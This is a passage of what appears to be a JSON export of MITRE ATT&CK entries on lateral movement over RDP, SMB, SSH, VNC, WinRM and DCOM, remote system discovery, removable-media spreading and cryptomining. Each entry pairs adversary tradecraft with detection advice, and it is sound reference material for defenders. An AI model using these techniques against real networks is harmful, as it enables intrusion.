BlackTech June 2017),"}
{"ID":"T1021.007","name":"Remote Services: Cloud Services","description":"Adversaries may log into accessible cloud services within a compromised environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078) that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. \n\nMany enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)), using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI.\n\nIn some cases, adversaries may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001) instead of a username and password. ","url":"https://attack.mitre.org/techniques/T1021/007","created":"21 February 2023","last modified":"14 April 2023","version":"1.0","tactics":"Lateral Movement","detection":null,"platforms":"Azure AD, Google Workspace, IaaS, Office 365, SaaS","data sources":"Logon Session: Logon Session Creation","is sub-technique":true,"sub-technique of":"T1021","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Mandiant Remediation and Hardening Strategies for Microsoft 365),(Citation: Protecting Microsoft 365 From On-Premises Attacks)"}
{"ID":"T1021.003","name":"Remote Services: Distributed Component Object Model","description":"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.\n\nThe Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)(Citation: Microsoft COM)\n\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.(Citation: Microsoft Process Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.(Citation: Microsoft COM ACL)\n\nThrough DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents(Citation: Enigma Excel DCOM Sept 2017) and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) (DDE) execution directly through a COM created instance of a Microsoft Office application(Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). (Citation: MSDN WMI)","url":"https://attack.mitre.org/techniques/T1021/003","created":"11 February 2020","last modified":"03 April 2023","version":"1.2","tactics":"Lateral Movement","detection":"Monitor for COM objects loading DLLs and other modules not typically associated with the application.(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) Enumeration of COM objects, via [Query Registry](https://attack.mitre.org/techniques/T1012) or [PowerShell](https://attack.mitre.org/techniques/T1059/001), may also proceed malicious use.(Citation: Fireeye Hunting COM June 2019)(Citation: Enigma MMC20 COM Jan 2017) Monitor for spawning of processes associated with COM objects, especially those invoked by a user different than the one currently logged on.\n\nMonitor for any influxes or abnormal increases in DCOM related Distributed Computing Environment/Remote Procedure Call (DCE/RPC) traffic (typically over port 135).","platforms":"Windows","data sources":"Module: Module Load, Network Traffic: Network Connection Creation, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1021","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Github PowerShell Empire),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Cobalt Strike DCOM Jan 2017),(Citation: Microsoft Disable DCOM),(Citation: Microsoft Process Wide Com Keys),(Citation: Microsoft COM ACL),(Citation: Microsoft System Wide Com Keys),(Citation: Microsoft Protected View)"}
{"ID":"T1021.001","name":"Remote Services: Remote Desktop Protocol","description":"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services) \n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1546/008) or [Terminal Services DLL](https://attack.mitre.org/techniques/T1505/005) for Persistence.(Citation: Alperovitch Malware)","url":"https://attack.mitre.org/techniques/T1021/001","created":"11 February 2020","last modified":"30 March 2023","version":"1.1","tactics":"Lateral Movement","detection":"Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.","platforms":"Windows","data sources":"Logon Session: Logon Session Creation, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1021","defenses bypassed":null,"contributors":"Matthew Demaske, Adaptforward","permissions required":"Remote Desktop Users, User","supports remote":null,"system requirements":"RDP service enabled, account in the Remote Desktop Users group","impact type":null,"effective permissions":null,"relationship citations":"(Citation: FireEye PLA),(Citation: Volexity Patchwork June 2018),(Citation: aptsim),(Citation: Twitter Cglyer Status Update APT3 eml),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: Cybereason Bumblebee August 2022),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: Group IB Silence Sept 2018),(Citation: Proofpoint TA505 October 2019),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: Novetta-Axiom),(Citation: FireEye APT39 Jan 2019),(Citation: Novetta Blockbuster RATs),(Citation: Costa AvosLocker May 2022),(Citation: DFIR Conti Bazar Nov 2021),(Citation: US-CERT TA18-074A),(Citation: SecureWorks August 2019),(Citation: Kaspersky Adwind Feb 2016),(Citation: FireEye APT41 Aug 2019),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Fidelis njRAT June 2013),(Citation: CERT-FR PYSA April 2020),(Citation: FireEye TRITON 2019),(Citation: Novetta Blockbuster),(Citation: Check Point Warzone Feb 2020),(Citation: Proofpoint TA505 Jan 2019),(Citation: FireEye FIN6 April 2016),(Citation: FireEye FIN6 Apr 2019),(Citation: FireEye APT40 March 2019),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Talos ZxShell Oct 2014),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: Github Koadic),(Citation: Cylance Shaheen Nov 2018),(Citation: Unit42 OilRig Playbook 2023),(Citation: GitHub QuasarRAT),(Citation: Group IB Cobalt Aug 2017),(Citation: BitDefender Chafer May 2020),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: McAfee Night Dragon),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: DFIR Phosphorus November 2021),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: cobaltstrike manual),(Citation: ClearSky Pay2Kitten December 2020),(Citation: FireEye FIN10 June 2017),(Citation: CrowdStrike Grim Spider May 2019),(Citation: Malwarebytes DarkComet March 2018),(Citation: Cymmetria Patchwork),(Citation: FireEye CARBANAK June 2017),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Cycraft Chimera April 2020),(Citation: GitHub Pupy),(Citation: PWC Cloud Hopper April 2017),(Citation: RedCanary Mockingbird May 2020),(Citation: Windows RDP Sessions),(Citation: Berkley Secure)"}
{"ID":"T1021.002","name":"Remote Services: SMB/Windows Admin Shares","description":"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over SMB,(Citation: Wikipedia Server Message Block) to interact with systems using remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration and patch levels.(Citation: Microsoft Admin Shares)","url":"https://attack.mitre.org/techniques/T1021/002","created":"11 February 2020","last modified":"03 April 2023","version":"1.1","tactics":"Lateral Movement","detection":"Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding. (Citation: Lateral Movement Payne)(Citation: Windows Event Forwarding Payne) Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [Net](https://attack.mitre.org/software/S0039), on the command-line interface and Discovery techniques that could be used to find remotely accessible systems.(Citation: Medium Detecting WMI Persistence)","platforms":"Windows","data sources":"Command: Command Execution, Logon Session: Logon Session Creation, Network Share: Network Share Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1021","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":"SMB enabled; Host/network firewalls not blocking SMB ports between source and destination; Use of domain account in administrator group on remote system or default system admin account.","impact type":null,"effective permissions":null,"relationship citations":"(Citation: Dragos Crashoverride 2018),(Citation: Fortinet Diavol July 2021),(Citation: NCC Group Chimera January 2021),(Citation: Microsoft Prestige ransomware October 2022),(Citation: NCC Group APT15 Alive and Strong),(Citation: Symantec Orangeworm April 2018),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Symantec Buckeye),(Citation: Talos Nyetya June 2017),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: FoxIT Wocao December 2019),(Citation: FireEye Shamoon Nov 2016),(Citation: Novetta-Axiom),(Citation: Novetta Blockbuster RATs),(Citation: MDSec Brute Ratel August 2022),(Citation: Securelist BlackEnergy Nov 2014),(Citation: Cybereason Royal December 2022),(Citation: Alperovitch 2014),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Kaspersky Regin),(Citation: Novetta Blockbuster),(Citation: Dark Vortex Brute Ratel C4),(Citation: Unit 42 Lucifer June 2020),(Citation: US-CERT NotPetya 2017),(Citation: CarbonBlack Conti July 2020),(Citation: Dell TG-1314),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Symantec W32.Duqu),(Citation: Symantec Chafer February 2018),(Citation: PsExec Russinovich),(Citation: Savill 1999),(Citation: McAfee Night Dragon),(Citation: DFIR Ryuk's Return October 2020),(Citation: Medium Anchor DNS July 2020),(Citation: Kaspersky Turla),(Citation: Malwarebytes Emotet Dec 2017),(Citation: Bleeping Computer - Ryuk WoL),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Talos Olympic Destroyer 2018),(Citation: Cylance Cleaver),(Citation: Palo Alto Brute Ratel July 2022),(Citation: SANS Conficker),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Cybereason Conti Jan 2021),(Citation: Cycraft Chimera April 2020),(Citation: ESET Hermetic Wizard March 2022),(Citation: Trend Micro Black Basta October 2022),(Citation: Cybereason Cobalt Kitty 2017),(Citation: RedCanary Mockingbird May 2020),(Citation: Microsoft Preventing SMB)"}
{"ID":"T1021.004","name":"Remote Services: SSH","description":"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.\n\nSSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user’s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.","url":"https://attack.mitre.org/techniques/T1021/004","created":"11 February 2020","last modified":"30 March 2023","version":"1.1","tactics":"Lateral Movement","detection":"Use of SSH may be legitimate depending on the environment and how it’s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with SSH. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.\n\nOn macOS systems <code>log show --predicate 'process = \"sshd\"'</code> can be used to review incoming SSH connection attempts for suspicious activity. The command <code>log show --info --predicate 'process = \"ssh\" or eventMessage contains \"ssh\"'</code> can be used to review outgoing SSH connection activity.(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)\n\nOn Linux systems SSH activity can be found in the logs located in <code>/var/log/auth.log</code> or <code>/var/log/secure</code> depending on the distro you are using.","platforms":"Linux, macOS","data sources":"Logon Session: Logon Session Creation, Network Traffic: Network Connection Creation, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1021","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":"An SSH server is configured and running.","impact type":null,"effective permissions":null,"relationship citations":"(Citation: FireEye TRITON 2019),(Citation: Aqua Kinsing April 2020),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: PWC Cloud Hopper April 2017),(Citation: FireEye APT40 March 2019),(Citation: Github PowerShell Empire),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Intezer TeamTNT September 2020),(Citation: Cisco Talos Intelligence Group),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Anomali Rocke March 2019),(Citation: Unit42 OilRig Playbook 2023),(Citation: Symantec Palmerworm Sep 2020),(Citation: Securelist GCMAN),(Citation: FireEye APT39 Jan 2019),(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)"}
{"ID":"T1021.005","name":"Remote Services: VNC","description":"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (“remote framebuffer”) protocol to enable users to remotely control another computer’s display by relaying the screen, mouse, and keyboard inputs over the network.(Citation: The Remote Framebuffer Protocol)\n\nVNC differs from [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.(Citation: MacOS VNC software for Remote Desktop)(Citation: VNC Authentication)\n\nAdversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.(Citation: Hijacking VNC)(Citation: macOS root VNC login without authentication)(Citation: VNC Vulnerabilities)(Citation: Offensive Security VNC Authentication Check)(Citation: Attacking VNC Servers PentestLab)(Citation: Havana authentication bug)","url":"https://attack.mitre.org/techniques/T1021/005","created":"11 February 2020","last modified":"30 March 2023","version":"1.1","tactics":"Lateral Movement","detection":"Use of VNC may be legitimate depending on the environment and how it’s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior using VNC.\n\nOn macOS systems <code>log show --predicate 'process = \"screensharingd\" and eventMessage contains \"Authentication:\"'</code> can be used to review incoming VNC connection attempts for suspicious activity.(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)\n\nMonitor for use of built-in debugging environment variables (such as those containing credentials or other sensitive information) as well as test/default users on VNC servers, as these can leave openings for adversaries to abuse.(Citation: Gnome Remote Desktop grd-settings)(Citation: Gnome Remote Desktop gschema)","platforms":"Linux, Windows, macOS","data sources":"Logon Session: Logon Session Creation, Network Traffic: Network Connection Creation, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1021","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":"VNC server installed and listening for connections.","impact type":null,"effective permissions":null,"relationship citations":"(Citation: objsee mac malware 2017),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: Check Point Warzone Feb 2020),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: ClearSky Siamesekitten August 2021),(Citation: Talos ZxShell Oct 2014),(Citation: Symantec Shuckworm January 2022),(Citation: Trickbot VNC module July 2021),(Citation: Prevx Carberp March 2011),(Citation: Bitdefender Trickbot VNC module Whitepaper 2021),(Citation: Securelist GCMAN),(Citation: Unit 42 Gamaredon February 2022),(Citation: Microsoft Actinium February 2022),"}
{"ID":"T1021.006","name":"Remote Services: Windows Remote Management","description":"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.\n\nWinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).(Citation: Microsoft WinRM) It may be called with the `winrm` command or by any number of programs such as PowerShell.(Citation: Jacobsen 2014) WinRM  can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).(Citation: MSDN WMI)","url":"https://attack.mitre.org/techniques/T1021/006","created":"11 February 2020","last modified":"23 June 2021","version":"1.1","tactics":"Lateral Movement","detection":"Monitor use of WinRM within an environment by tracking service execution. If it is not normally used or is disabled, then this may be an indicator of suspicious behavior.  Monitor processes created and actions taken by the WinRM process or a WinRM invoked script to correlate it with other related events.(Citation: Medium Detecting Lateral Movement) Also monitor for remote WMI connection attempts (typically over port 5985 when using HTTP and 5986 for HTTPS).","platforms":"Windows","data sources":"Command: Command Execution, Logon Session: Logon Session Creation, Network Traffic: Network Connection Creation, Process: Process Creation, Service: Service Metadata","is sub-technique":true,"sub-technique of":"T1021","defenses bypassed":null,"contributors":null,"permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: cobaltstrike manual),(Citation: NCC Group Chimera January 2021),(Citation: Palo Alto Brute Ratel July 2022),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Symantec RAINDROP January 2021),(Citation: NSA Spotting)"}
{"ID":"T1018","name":"Remote System Discovery","description":"Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  [Ping](https://attack.mitre.org/software/S0097) or <code>net view</code> using [Net](https://attack.mitre.org/software/S0039).\n\nAdversaries may also analyze data from local host files (ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> or <code>/etc/hosts</code>) or other passive means (such as local [Arp](https://attack.mitre.org/software/S0099) cache entries) in order to discover the presence of remote systems in an environment.\n\nAdversaries may also target discovery of network infrastructure as well as leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands on network devices to gather detailed information about systems within a network (e.g. <code>show cdp neighbors</code>, <code>show arp</code>).(Citation: US-CERT-TA18-106A)(Citation: CISA AR21-126A FIVEHANDS May 2021)  \n","url":"https://attack.mitre.org/techniques/T1018","created":"31 May 2017","last modified":"30 March 2023","version":"3.4","tactics":"Discovery","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nMonitor for processes that can be used to discover remote systems, such as <code>ping.exe</code> and <code>tracert.exe</code>, especially when executed in quick succession.(Citation: Elastic - Koadiac Detection with EQL)","platforms":"Linux, Network, Windows, macOS","data sources":"Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Austin Clark, @c2defense; Daniel Stepanic, Elastic; RedHuntLabs, @redhuntlabs","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Dragos Crashoverride 2018),(Citation: Red Canary Hospital Thwarted Ryuk October 2020),(Citation: AlienVault Sykipot 2011),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Group IB Silence Sept 2018),(Citation: FoxIT Wocao December 2019),(Citation: Aqua Kinsing April 2020),(Citation: Symantec Leafminer July 2018),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Crowdstrike Qakbot October 2020),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: SecureWorks WannaCry Analysis),(Citation: Talos Cobalt Strike September 2020),(Citation: CME Github September 2018),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Palo Alto CVE-2015-3113 July 2015),(Citation: Fidelis njRAT June 2013),(Citation: TechNet Arp),(Citation: BitDefender Chafer May 2020),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: NTT Security Flagpro new December 2021),(Citation: Bitdefender FIN8 July 2021),(Citation: GovCERT Carbon May 2016),(Citation: Debian nbtscan Nov 2019),(Citation: Symantec WastedLocker June 2020),(Citation: Cybereason Bumblebee August 2022),(Citation: Symantec Orangeworm April 2018),(Citation: RATANKBA),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Alperovitch 2014),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Bitdefender Naikon April 2021),(Citation: Symantec Chafer February 2018),(Citation: Palo Alto ARP),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: CrowdStrike BloodHound April 2018),(Citation: Cybereason Soft Cell June 2019),(Citation: Nccgroup Emissary Panda May 2018),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: FireEye APT10 April 2017),(Citation: TrendMicro EarthLusca 2022),(Citation: Fortinet Diavol July 2021),(Citation: NCC Group APT15 Alive and Strong),(Citation: FireEye Shamoon Nov 2016),(Citation: FireEye APT39 Jan 2019),(Citation: Kaspersky APT Trends Q1 2020),(Citation: ESET Telebots Dec 2016),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: Talos Rocke August 2018),(Citation: FireEye Clandestine Fox),(Citation: Rapid7 HAFNIUM Mar 2021),(Citation: Nltest Manual),(Citation: Cyberreason Anchor December 2019),(Citation: ESET Industroyer),(Citation: Roadtools),(Citation: TechNet Ping),(Citation: FireEye FIN6 April 2016),(Citation: Kaspersky Lyceum October 2021),(Citation: FireEye FIN6 Apr 2019),(Citation: Savill 1999),(Citation: ASERT Donot March 2018),(Citation: DFIR Ryuk's Return October 2020),(Citation: Kaspersky Turla),(Citation: DFIR Phosphorus November 2021),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Talos Olympic Destroyer 2018),(Citation: FireEye Periscope March 2018),(Citation: CrowdStrike Grim Spider May 2019),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: ESET Hermetic Wizard March 2022),(Citation: Trend Micro Black Basta October 2022),(Citation: Cybereason Cobalt Kitty 2017),(Citation: NCC Group Chimera January 2021),(Citation: Symantec Buckeye),(Citation: Check Point Black Basta October 2022),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: Kaspersky QakBot September 2021),(Citation: US-CERT TA18-074A),(Citation: Cybereason Bazar July 2020),(Citation: ClearSky Lazarus Aug 2020),(Citation: Microsoft BlackCat Jun 2022),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: ESET ComRAT May 2020),(Citation: Gigamon Berserk Bear October 2021),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: FireEye Ryuk and Trickbot January 2019),(Citation: cobaltstrike manual),(Citation: Talos PoetRAT April 2020),(Citation: Secureworks GOLD KINGSWOOD September 2018),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: Crowdstrike Indrik November 2018),(Citation: SecTools nbtscan June 2003),"}
{"ID":"T1091","name":"Replication Through Removable Media","description":"Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.\n\nMobile devices may also be used to infect PCs with malware if connected via USB.(Citation: Exploiting Smartphone USB ) This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables.(Citation: Windows Malware Infecting Android)(Citation: iPhone Charging Cable Hack) For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).","url":"https://attack.mitre.org/techniques/T1091","created":"31 May 2017","last modified":"21 October 2022","version":"1.2","tactics":"Initial Access, Lateral Movement","detection":"Monitor file access on removable media. Detect processes that execute from removable media after it is mounted or when initiated by a user. If a remote access tool is used in this manner to move laterally, then additional actions are likely to occur after execution, such as opening network connections for Command and Control and system and network information Discovery.","platforms":"Windows","data sources":"Drive: Drive Creation, File: File Access, File: File Creation, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Joas Antonio dos Santos, @Cr4zyC0d3","permissions required":null,"supports remote":null,"system requirements":"Removable media allowed, Autorun enabled or vulnerability present that allows for code execution","impact type":null,"effective permissions":null,"relationship citations":"(Citation: ThreatExpert Agent.btz),(Citation: TrendMicro Ursnif File Dec 2014),(Citation: FBI Flash FIN7 USB),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Trend Micro Conficker),(Citation: Kaspersky Darkhotel),(Citation: Forcepoint Monsoon),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: ESET Sednit USBStealer 2014),(Citation: Cisco H1N1 Part 2),(Citation: FireEye APT30),(Citation: Fidelis njRAT June 2013),(Citation: TrendMicro Ursnif Mar 2015),(Citation: Kaspersky LuminousMoth July 2021),(Citation: Bitdefender LuminousMoth July 2021),(Citation: Secureworks IRON TWILIGHT Active Measures March 2017),(Citation: Microsoft SIR Vol 19),(Citation: Avira Mustang Panda January 2020),(Citation: Eset Ramsay May 2020),(Citation: DustySky),(Citation: Kaspersky Flame),(Citation: FireEye APT28),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Trend Micro Qakbot May 2020),(Citation: Trend Micro njRAT 2018),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: SANS Conficker),(Citation: TechNet Removable Media Control),(Citation: Microsoft Disable Autorun),(Citation: win10_asr)"}
{"ID":"T1496","name":"Resource Hijacking","description":"Adversaries may leverage the resources of co-opted systems in order to solve resource intensive problems, which may impact system and/or hosted service availability. \n\nOne common purpose for Resource Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive.(Citation: Kaspersky Lazarus Under The Hood Blog 2017) Servers and cloud-based systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for Resource Hijacking and cryptocurrency mining.(Citation: CloudSploit - Unused AWS Regions) Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster.(Citation: Unit 42 Hildegard Malware)(Citation: Trend Micro Exposed Docker APIs)\n\nAdditionally, some cryptocurrency mining malware identify then kill off processes for competing malware to ensure it’s not competing for resources.(Citation: Trend Micro War of Crypto Miners)\n\nAdversaries may also use malware that leverages a system's network bandwidth as part of a botnet in order to facilitate [Network Denial of Service](https://attack.mitre.org/techniques/T1498) campaigns and/or to seed malicious torrents.(Citation: GoBotKR)","url":"https://attack.mitre.org/techniques/T1496","created":"17 April 2019","last modified":"18 April 2022","version":"1.3","tactics":"Impact","detection":"Consider monitoring process resource usage to determine anomalous activity associated with malicious hijacking of computer resources such as CPU, memory, and graphics processing resources. Monitor for suspicious use of network resources associated with cryptocurrency mining software. Monitor for common cryptomining software process names and files on local systems that may indicate compromise and resource usage.","platforms":"Containers, IaaS, Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Creation, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow, Process: Process Creation, Sensor Health: Host Status","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Alfredo Oliveira, Trend 